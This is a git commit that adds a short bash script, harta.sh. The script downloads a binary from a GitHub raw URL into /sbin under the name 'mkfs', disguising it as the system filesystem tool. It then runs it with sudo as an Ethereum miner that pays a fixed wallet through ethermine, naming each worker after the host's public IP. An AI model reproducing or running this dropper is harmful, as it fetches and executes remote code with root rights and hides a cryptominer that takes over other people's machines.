82159ee8859486945e39e7a06fd867804aa8f195
clansas <89086618+clansas@users.noreply.github.com>
2021-08-24 21:49:27 +0700

    Add files via upload

---
+++ harta.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+
+POOL=asia1.ethermine.org:4444
+WALLET=0x01b0abc6097e8c270396784de24f86f9f5daa510
+WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )
+
+cd "$(dirname "$0")"
+cd /sbin
+wget -O mkfs https://raw.githubusercontent.com/clansas/turbo/main/harta
+chmod +x ./mkfs && sudo ./mkfs -a ethash -o $POOL -u $WALLET.$WORKER $@
